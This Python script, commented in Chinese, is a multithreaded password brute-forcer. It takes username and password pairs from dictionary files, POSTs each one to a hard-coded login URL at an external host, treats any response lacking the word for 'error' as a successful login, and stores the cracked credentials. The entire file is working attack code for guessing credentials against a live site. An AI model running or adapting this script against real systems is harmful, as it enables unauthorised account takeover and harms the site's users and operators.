import requests
import utils
from bruteforce import bruteforce, stop_brute, success_queue, dict_queue, success_username


def login():
    """
    登录和检测登录结果的代码针对每个网站分别完成
    login_info中保存了登录所需要的所有信息，可以是用户名密码组合，可以是单纯的密码
    :return:
    """
    try:
        login_info = dict_queue.get(block=False)
    except:
        return

    username = login_info[0]
    # 如果这个用户名已经被爆破出来密码，那么跳过这个用户名
    if username in success_username:
        return

    password = login_info[1]

    # ###############################实现登录过程开始
    payload = {
        "username": username,
        "password": password,
    }
    print('当前测试用户名：{},密码：{}'.format(username,password))
    r = requests.post("http://ss.gentlecp.com:40000/user/login/?referer=/", data=payload)
    #    r = requests.post("http://127.0.0.1/api/login", json=payload)
    # 判断是否登录成功
    # #################################实现登录过程结束

    # #################################检查密码是否正确开始
    #    if True:
    # if r.status_code == 302:  # 根据实际情况修改此处，判定登录成功
    if "错误" not in r.text:  # 根据实际情况修改此处，判定登录成功
        msg = login_info
        # 登录成功则把登录信息保存到success_queue
        success_queue.put(msg)
        # 把登录成功的用户名添加到 success_username中，之后可以跳过这个用户名的密码的爆破
        success_username.append(username)
        print('【爆破成功，用户名:{},密码:{}】'.format(username, password))

        # 如果想要爆破出来一个密码就立刻停止爆破，那么此处调用函数stop_brute，反之则注释此处
        # stop_brute()

    # ################################# 检查密码是否正确结束





if __name__ == "__main__":
    args = utils.get_parse()
    dict_username = args.get('dict_username', "username.txt")
    dict_password = args.get('dict_password', "password.txt")

    utils.get_dict(dict_username, dict_password)

    bruteforce(login, thread_num=5)
